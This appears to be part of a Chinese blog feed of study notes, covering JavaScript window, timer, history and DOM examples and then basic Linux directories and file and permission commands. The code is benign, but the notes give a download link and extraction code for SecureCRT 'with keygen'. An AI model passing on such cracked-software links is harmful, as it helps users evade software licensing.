class="number">0</span>;i&lt;selectseason.length;i++)&#123;</span></span><br><span class="line"><span class="javascript">				<span class="keyword">if</span>(selectseason[i].checked==<span class="literal">true</span>)&#123;</span></span><br><span class="line">					myseason=selectseason[i].value;</span><br><span class="line"><span class="javascript">					<span class="keyword">break</span>;</span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"><span class="javascript">            <span class="comment">//opener指打开它的父窗口，window</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">this</span>.opener.document.getElementById(<span class="string">&quot;season&quot;</span>).value=myseason;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">this</span>.close();</span></span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2、location"><a href="#2、location" class="headerlink" title="2、location"></a>2、location</h4><blockquote>
<p>​        <strong>location.href=”url地址”;</strong></p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;btn&quot;</span> <span class="attr">value</span>=<span class="string">&quot;跳转&quot;</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.baidu.com&quot;</span>&gt;</span>百度<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">	<span class="keyword">var</span> btn=<span class="built_in">document</span>.getElementById(<span class="string">&quot;btn&quot;</span>);</span></span><br><span class="line"><span class="javascript">	btn.onclick=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">		location.href=<span class="string">&quot;http://www.baidu.com&quot;</span>;</span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="3、定时器"><a href="#3、定时器" class="headerlink" title="3、定时器"></a>3、定时器</h4><blockquote>
<p>settimeout 设置延时时间</p>
<p>​    clearInterval(timer) 清除时间间隔</p>
<p>setInterval 设置时间间隔</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;input type=<span class="string">&quot;button&quot;</span>value=<span class="string">&quot;俩秒后弹出提示&quot;</span> onclick=<span class="string">&quot;fn1()&quot;</span> /&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;button&quot;</span>value=<span class="string">&quot;每俩秒弹出提示&quot;</span> onclick=<span class="string">&quot;fn2()&quot;</span> /&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;button&quot;</span>value=<span class="string">&quot;每俩秒弹出提示2&quot;</span> onclick=<span class="string">&quot;fn()&quot;</span> /&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;button&quot;</span>value=<span class="string">&quot;清除&quot;</span> onclick=<span class="string">&quot;fn3()&quot;</span> /&gt;</span><br><span class="line"><span class="keyword">var</span> timer;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="built_in">window</span>.setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			alert(<span class="string">&quot;helloworld&quot;</span>)</span><br><span class="line">		&#125;,<span class="number">2000</span>);</span><br><span class="line">&#125;</span><br><span class="line">		</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn2</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		alert(<span class="string">&quot;helloworld&quot;</span>);</span><br><span class="line">		timer=<span class="built_in">window</span>.setTimeout(fn2,<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line">		</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		timer=<span class="built_in">window</span>.setInterval(</span><br><span class="line">		<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			alert(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line">		&#125;,<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn3</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="built_in">clearInterval</span>(timer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="4、history"><a href="#4、history" class="headerlink" title="4、history"></a>4、history</h4><blockquote>
<p>back forward</p>
<p>go(-1)  go(1)</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;上一页&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;history.back()&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;下一页&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;history.forward()()&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;上一页&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;history.go(-1)&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;下一页&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;history.go(1)&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="5、move"><a href="#5、move" class="headerlink" title="5、move"></a>5、move</h4><blockquote>
<p>移动：moveTo 绝对  moveBy 相对</p>
<p>改变大小：resizeTo绝对  resizeBy相对</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;移动&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;move()&quot;</span> /&gt;</span><span class="symbol">&amp;nbsp;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;改变大小（绝对值）&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;change1()&quot;</span> /&gt;</span><span class="symbol">&amp;nbsp;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;改变大小（相对值）&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;change2()&quot;</span> /&gt;</span><span class="symbol">&amp;nbsp;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">			<span class="function"><span class="keyword">function</span> <span class="title">move</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">				<span class="built_in">window</span>.moveBy(<span class="number">200</span>,<span class="number">400</span>);</span></span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line"><span class="javascript">			<span class="function"><span class="keyword">function</span> <span class="title">change1</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">				<span class="built_in">window</span>.resizeTo(<span class="number">400</span>,<span class="number">200</span>);</span></span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line"><span class="javascript">			<span class="function"><span class="keyword">function</span> <span class="title">change2</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">				<span class="built_in">window</span>.resizeBy(<span class="number">100</span>,<span class="number">100</span>);</span></span><br><span class="line">			&#125;</span><br></pre></td></tr></table></figure>

<h4 id="6、广告漂浮"><a href="#6、广告漂浮" class="headerlink" title="6、广告漂浮"></a>6、广告漂浮</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">move</span>(<span class="params"></span>)</span>&#123;								         </span><br><span class="line">        <span class="built_in">document</span>.getElementById(<span class="string">&quot;layer1&quot;</span>).style.left=<span class="built_in">Math</span>.random()*<span class="number">1166</span>+<span class="string">&quot;px&quot;</span>;</span><br><span class="line">		<span class="built_in">document</span>.getElementById(<span class="string">&quot;layer1&quot;</span>).style.top=<span class="built_in">Math</span>.random()*<span class="number">500</span>+<span class="string">&quot;px&quot;</span>;</span><br><span class="line">		<span class="built_in">setTimeout</span>(move,<span class="number">1000</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;body onload=<span class="string">&quot;move();&quot;</span>&gt;</span><br><span class="line">	&lt;div id=<span class="string">&quot;layer1&quot;</span> style=<span class="string">&quot;position:absolute;&quot;</span>&gt;</span><br><span class="line">		&lt;a href=<span class="string">&quot;http://&quot;</span>&gt;</span><br><span class="line">		    &lt;img src=<span class="string">&quot;mm.jpg&quot;</span> width=<span class="string">&quot;200&quot;</span> height=<span class="string">&quot;200&quot;</span> border=<span class="string">&quot;0&quot;</span>&gt;</span><br><span class="line">		&lt;/a&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">	&lt;h2&gt;随机漂浮的广告&lt;/h2&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>

<h2 id="七、Dom"><a href="#七、Dom" class="headerlink" title="七、Dom"></a>七、Dom</h2><p>dom文档对象模型</p>
<h4 id="1、Element"><a href="#1、Element" class="headerlink" title="1、Element"></a>1、Element</h4><blockquote>
<p>getElementById</p>
<p>getElementByNames</p>
<p>getElementByTagName</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> txt=<span class="built_in">document</span>.getElementById(<span class="string">&quot;tid&quot;</span>);</span><br><span class="line">	alert(txt.value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;tname&quot;</span> value=<span class="string">&quot;砺锋IT精英培训_1&quot;</span> id=<span class="string">&quot;tid_1&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;tname&quot;</span> value=<span class="string">&quot;砺锋IT精英培训_2&quot;</span> id=<span class="string">&quot;tid_2&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;tname&quot;</span> value=<span class="string">&quot;砺锋IT精英培训_3&quot;</span> id=<span class="string">&quot;tid_3&quot;</span>&gt;&lt;br&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> inputNodes=<span class="built_in">document</span>.getElementsByName(<span class="string">&quot;tname&quot;</span>);</span><br><span class="line">alert(inputNodes.length);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;inputNodes.length;i++)&#123;</span><br><span class="line">   <span class="keyword">var</span> inputNode=inputNodes[i];</span><br><span class="line">   alert(inputNode.value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">var inputNodes=document.getElementsByTagName(&quot;input&quot;);</span><br><span class="line">			alert(inputNodes.length);</span><br><span class="line">			for(var i=0;i&lt;inputNodes.length;i++)&#123;</span><br><span class="line">				var inputNode=inputNodes[i];</span><br><span class="line">				alert(inputNode.value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2、innerHtml"><a href="#2、innerHtml" class="headerlink" title="2、innerHtml"></a>2、innerHtml</h4><blockquote>
<p>innerHTML</p>
<p>innerText</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;subject&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">h3</span>&gt;</span>JavaScript<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span><span class="attr">value</span>=<span class="string">&quot;获取HTML&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;fn1()&quot;</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span><span class="attr">value</span>=<span class="string">&quot;替换HTML&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;fn2()&quot;</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span><span class="attr">value</span>=<span class="string">&quot;获取TEXT&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;fn3()&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//获取</span></span></span><br><span class="line"><span class="javascript">		<span class="function"><span class="keyword">function</span> <span class="title">fn1</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">			<span class="keyword">var</span> div=<span class="built_in">document</span>.getElementById(<span class="string">&quot;subject&quot;</span>);</span></span><br><span class="line">			alert(div.innerHTML);</span><br><span class="line">		&#125;</span><br><span class="line"><span class="javascript">		<span class="comment">//替换</span></span></span><br><span class="line"><span class="javascript">		<span class="function"><span class="keyword">function</span> <span class="title">fn2</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">			<span class="keyword">var</span> div=<span class="built_in">document</span>.getElementById(<span class="string">&quot;subject&quot;</span>);</span></span><br><span class="line"><span class="handlebars"><span class="xml">			div.innerHTML=&quot;<span class="tag">&lt;<span class="name">h1</span>&gt;</span>JQUERY<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>&quot;;</span></span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="javascript">		<span class="comment">//获取text（javaScript）</span></span></span><br><span class="line"><span class="javascript">		<span class="function"><span class="keyword">function</span> <span class="title">fn3</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">			<span class="keyword">var</span> div=<span class="built_in">document</span>.getElementById(<span class="string">&quot;subject&quot;</span>);</span></span><br><span class="line">			alert(div.innerText);</span><br><span class="line">		&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="3、全选和全不选"><a href="#3、全选和全不选" class="headerlink" title="3、全选和全不选"></a>3、全选和全不选</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;td&gt;<span class="xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;all&quot;</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">value</span>=<span class="string">&quot;全选&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;check();&quot;</span> /&gt;</span></span>全选&lt;/td&gt;</span><br><span class="line"></span><br><span class="line">&lt;td&gt;<span class="xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;product&quot;</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;checkAll();&quot;</span>/&gt;</span></span>&lt;/td&gt;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;	</span><br><span class="line">	<span class="keyword">var</span> all=<span class="built_in">document</span>.getElementById(<span class="string">&quot;all&quot;</span>);</span><br><span class="line">	<span class="keyword">var</span> flag=all.checked;</span><br><span class="line">	<span class="keyword">var</span> products=<span class="built_in">document</span>.getElementsByName(<span class="string">&quot;product&quot;</span>);</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;products.length;i++)&#123;</span><br><span class="line">             products[i].checked=flag;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">                                            </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkAll</span>(<span class="params"></span>)</span>&#123;			</span><br><span class="line">     <span class="keyword">var</span> products=<span class="built_in">document</span>.getElementsByName(<span class="string">&quot;product&quot;</span>);</span><br><span class="line">     <span class="keyword">var</span> all=<span class="built_in">document</span>.getElementById(<span class="string">&quot;all&quot;</span>);</span><br><span class="line">     <span class="keyword">var</span> flag=<span class="literal">true</span>;</span><br><span class="line">	 <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;products.length;i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(products[i].checked==<span class="literal">false</span>)&#123;</span><br><span class="line">			flag=<span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	all.checked=flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>linux常见命令</title>
    <url>/2020/10/11/01%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h3 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h3><blockquote>
<p>SecureCRT 8.3.3最新版本（含注册机）<br>链接：<a href="https://pan.baidu.com/s/19xLtSOL7bnWlaXqt55Uhqw">https://pan.baidu.com/s/19xLtSOL7bnWlaXqt55Uhqw</a><br>提取码：ww8b</p>
<p><a href="https://download.csdn.net/download/dest_dest/10711362?utm_source=bbsseo">https://download.csdn.net/download/dest_dest/10711362?utm_source=bbsseo</a></p>
</blockquote>
<h4 id="1、注意"><a href="#1、注意" class="headerlink" title="1、注意"></a>1、注意</h4><ul>
<li><p>严格区分大小写</p>
</li>
<li><p>所有内容以文件形式保存，包括硬件</p>
<ul>
<li>硬盘文件/dev/sd[a-p]</li>
<li>光盘文件/dev/sr0等</li>
</ul>
</li>
<li><p>Linux不靠扩展名区分文件类型，靠权限。</p>
</li>
<li><p>Linux所有的存储设备必须挂载之后用户才能使用，包括硬盘、U盘、光盘</p>
</li>
<li><p>windows下程序不能直接在Linux中安装和运行</p>
</li>
</ul>
<h4 id="2、目录"><a href="#2、目录" class="headerlink" title="2、目录"></a>2、目录</h4><blockquote>
<ul>
<li><strong>/bin</strong>：<br>bin 是 Binaries (二进制文件) 的缩写, 这个目录存放着最经常使用的命令。</li>
<li><strong>/sbin</strong>：<br>s 就是 Super User 的意思，是 Superuser Binaries (超级用户的二进制文件) 的缩写，这里存放的是系统管理员使用的系统管理程序。</li>
<li><strong>/boot：</strong><br>这里存放的是启动 Linux 时使用的一些核心文件，包括一些连接文件以及镜像文件。</li>
<li><strong>/dev ：</strong><br>dev 是 Device(设备) 的缩写, 该目录下存放的是 Linux 的外部设备，在 <strong>Linux 中访问设备的方式和访问文件的方式是相同的。</strong></li>
<li><strong>/etc：</strong><br>etc 是 Etcetera(等等) 的缩写,这个目录用来存放所有的<strong>系统管理所需要的配置文件和子目录。</strong></li>
<li><strong>/home</strong>：<br>用户的主目录，在 Linux 中，每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的，如上图中的 alice、bob 和 eve</li>
<li><strong>/srv</strong>：<br> 该目录存放一些<strong>服务启动之后需要提取的数据。</strong></li>
<li><strong>/root</strong>：<br>该目录为系统管理员，也称作超级权限者的用户主目录。</li>
<li><strong>/tmp</strong>：<br>tmp 是 temporary(临时) 的缩写这个目录是用来存放一些临时文件的。</li>
</ul>
</blockquote>
<blockquote>
<p><strong>日志</strong></p>
<p><strong>/var</strong>：<br>var 是 variable(变量) 的缩写，这个目录中存放着在不断扩充着的东西，我们习惯将那些经常被修改的目录放在这个目录下。包括各种日志文件</p>
</blockquote>
<blockquote>
<p><strong>资源数据</strong></p>
<ul>
<li><strong>/usr</strong>：<br> usr 是 unix shared resources(共享资源) 的缩写，这是一个非常重要的目录，用户的很多应用程序和文件都放在这个目录下，类似于 windows 下的 program files 目录。</li>
<li><strong>/usr/bin：</strong><br>系统用户使用的应用程序</li>
</ul>
</blockquote>
<blockquote>
<p><strong>非法关机</strong></p>
<ul>
<li><strong>/lost+found</strong>：<br>这个目录一般情况下是空的，当系统非法关机后，这里就存放了一些文件。</li>
</ul>
</blockquote>
<blockquote>
<p><strong>挂载</strong></p>
<ul>
<li><strong>/media</strong>：<br>linux 系统会自动识别一些设备，例如U盘、光驱等等，当识别后，Linux 会把识别的设备挂载到这个目录下。</li>
<li><strong>/mnt</strong>：<br>系统提供该目录是为了让用户临时挂载别的文件系统的，我们可以将光驱挂载在 /mnt/ 上，然后进入该目录就可以查看光驱里的内容</li>
</ul>
</blockquote>
<blockquote>
<p><strong>进程，不能写东西</strong></p>
<p><strong>/proc</strong>：<br>proc 是 Processes(进程) 的缩写，/proc 是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，这个目录是一个虚拟的目录，它是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息。<br>这个目录的内容不在硬盘上而是在内存里，我们也可以直接修改里面的某些文件，比如可以通过下面的命令来屏蔽主机的ping命令，使别人无法ping你的机器：</p>
<p><strong>/sys</strong>：</p>
<p>这是 Linux2.6 内核的一个很大的变化。该目录下安装了 2.6 内核中新出现的一个文件系统 sysfs 。</p>
<p>sysfs 文件系统集成了下面3种文件系统的信息：针对进程信息的 proc 文件系统、针对设备的 devfs 文件系统以及针对伪终端的 devpts 文件系统。</p>
<p>该文件系统是内核设备树的一个直观反映。</p>
<p>当一个内核对象被创建的时候，对应的文件和目录也在内核对象子系统中被创建。</p>
</blockquote>
<h4 id="3、服务器注意"><a href="#3、服务器注意" class="headerlink" title="3、服务器注意"></a>3、服务器注意</h4><ul>
<li><p>远程服务器不允许关机，只能重启</p>
</li>
<li><p>重启应该关闭服务</p>
</li>
<li><p>合理分配权限</p>
</li>
<li><p>定期备份重要数据和日志</p>
</li>
</ul>
<h3 id="二、常见命令"><a href="#二、常见命令" class="headerlink" title="二、常见命令"></a>二、常见命令</h3><blockquote>
<p>su username 更改用户</p>
</blockquote>
<blockquote>
<p>命令格式： <strong>命令[ -选项] [参数]</strong>    exp: ls -la /etc</p>
<ul>
<li>个别命令不遵循该格式</li>
<li>有多个选项时，可以写在一起</li>
<li>简化选项与完整选项  -a == –all</li>
</ul>
</blockquote>
<h4 id="1、文件处理命令"><a href="#1、文件处理命令" class="headerlink" title="1、文件处理命令"></a>1、文件处理命令</h4><h5 id="1-1-目录查看命令"><a href="#1-1-目录查看命令" class="headerlink" title="1.1 目录查看命令"></a>1.1 目录查看命令</h5><blockquote>
<p>ls  (list) </p>
<p>命令所在路径  /bin/ls  执行权限: 所有用户  功能: 显示目录文件 </p>
<p>语法：ls 选项[-ald] [文件或目录]  </p>
<ul>
<li>-a 显示所有文件，包括隐藏文件</li>
<li>-l 详细信息显示</li>
<li>-d 查看目录属性</li>
</ul>
</blockquote>
<p><strong>文件类型</strong>:  - 二进制文件   d 目录    l软链接文件</p>
<p><strong>权限</strong>:   w写         r写        x执行   </p>
<p><strong>用户</strong>:   u所有者 g所属组 o其他人    </p>
<h5 id="1-2-目录处理命令"><a href="#1-2-目录处理命令" class="headerlink" title="1.2 目录处理命令"></a>1.2 目录处理命令</h5><p><strong>可以使用相对路径，但要保证文件在当前目录下</strong></p>
<blockquote>
<p>mkdir (make directories)  所在路径：/bin/mkdir</p>
<p>权限: 所有用户 语法： mkdir -p [目录名]</p>
<p>功能：创建新目录 -p递归创建</p>
</blockquote>
<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201011232156487.png" alt="image-20201011232156487" style="zoom:80%;" />

<blockquote>
<p>cd (change directory)  所在路径：shell内置命令</p>
<p>权限：所有用户 语法：cd[目录]</p>
<p>功能：切换目录</p>
</blockquote>
<blockquote>
<p>pwd 功能：显示当前工作目录</p>
<p>cd . 当前目录  cd ..上一级目录</p>
</blockquote>
<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201011232735209.png" alt="image-20201011232735209" style="zoom:80%;" />

<blockquote>
<p>rmdir  所在路径 /bin/rmdir</p>
<p>rmdir[目录]  </p>
<p>功能：删除<strong>空目录</strong></p>
</blockquote>
<blockquote>
<p>cp  所在路径/bin/cp</p>
<p>语法：cp -rp[原文件或目录] [可复制多个]     [目标目录]</p>
<p>​                  -r 复制目录</p>
<p>​                  -p 保留文本属性</p>
<p>功能：<strong>复制</strong>文件或目录</p>
</blockquote>
<blockquote>
<p>mv (move)  路径：/bin/mv</p>
<p>权限：所有用户 语法：mv[原文件或目录] [目标目录]</p>
<p>功能：<strong>剪切</strong>文件、改名</p>
</blockquote>
<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201012102428841.png" alt="image-20201012102428841" style="zoom:80%;" />

<blockquote>
<p>rm(remove) 路径/bin/rm </p>
<p>权限：所有用户 功能：删除文件或目录</p>
<p>语法：rm -rf[文件或目录]</p>
<p>​                    -r 删除目录</p>
<p>​                    -f 强制执行</p>
</blockquote>
<h5 id="1-3-文件处理命令"><a href="#1-3-文件处理命令" class="headerlink" title="1.3 文件处理命令"></a>1.3 文件处理命令</h5><blockquote>
<p>touch  /bin/touch</p>
<p>权限：所有用户 语法：touch[文件名]</p>
<p>功能：创建空文件</p>
</blockquote>
<img src="C:%5CUsers%5Cadmin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201012105004851.png" alt="image-20201012105004851" style="zoom:80%;" />

<blockquote>
<ul>
<li>cat /bin/cat</li>
</ul>
<p>权限：所有用户 语法：cat[文件名]</p>
<p>功能：显示文件内容     -n显示行号</p>
<ul>
<li>tac 功能：反向显示</li>
</ul>
</blockquote>
<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201012105630797.png" alt="image-20201012105630797" style="zoom:80%;" />

<blockquote>
<ul>
<li><p>more 语法 more[文件名]  </p>
<p>​            （空格)或f 翻页</p>
<p>​                Enter  换行</p>
<p>​                q或Q 退出</p>
<p>功能：分页显示文件内容</p>
</li>
<li><p>less 路径：/usr/bin/less</p>
<p>功能：分页显示文件内容(可向上翻页<code>pg up</code>，<code>/搜索内容,n看下个搜索</code>)</p>
</li>
<li><p>head -n 行号  功能：前几行</p>
</li>
<li><p>tail     -n 行号  功能：后几行</p>
<p>​          -f 功能：动态显示</p>
</li>
</ul>
</blockquote>
<h5 id="1-4-链接文件"><a href="#1-4-链接文件" class="headerlink" title="1.4 链接文件"></a>1.4 链接文件</h5><blockquote>
<p>ln /bin/ln 权限：所有用户</p>
<p>ln -s[原文件] [目标文件]   -s 创建软链接</p>
</blockquote>
<ul>
<li>软链接：类似windows快捷方式  lrwxrwxrwx</li>
</ul>
<p>​                只是符号链接，箭头指向源文件。</p>
<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201012140408781.png" alt="image-20201012140408781" style="zoom:80%;" />

<ul>
<li><p>硬链接</p>
<ul>
<li>拷贝 cp -p+同步更新</li>
<li>通过i节点识别</li>
<li>不能跨分区，不能针对目录使用</li>
</ul>
<p>​                </p>
</li>
</ul>
<h4 id="2、权限管理命令"><a href="#2、权限管理命令" class="headerlink" title="2、权限管理命令"></a>2、权限管理命令</h4><blockquote>
<p>权限用数字表示 ：r–4(100) w–2(010)  x–1(001)</p>
</blockquote>
<h5 id="2-1-改变权限"><a href="#2-1-改变权限" class="headerlink" title="2.1 改变权限"></a>2.1 改变权限</h5><blockquote>
<p>chmod  路径 /bin/chmod</p>
<p>语法： chmod[{ugoa}{+-=}{rwx}] [文件或目录]    </p>
<p>​                         [421] [文件或目录]</p>
<p>​                        -R递归修改</p>
<p>功能：改变文件权限</p>
</blockquote>
<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201012221017562.png" alt="image-20201012221017562" style="zoom:80%;" />

<p><strong>目录和文件权限</strong></p>
<p>file r: 可以查看文件 cat/tac/more/less/tail/head</p>
<p>​    w:  可以修改文件内容  vim</p>
<p>​    x: 可以执行文件   script command</p>
<p>directory  r  可以列出目录内容 ls</p>
<p>​                w 可以目录中创建/删除文件目录 touch/rm/mkdir/rmdir</p>
<p>​                x 可以进入目录 cd</p>
<ul>
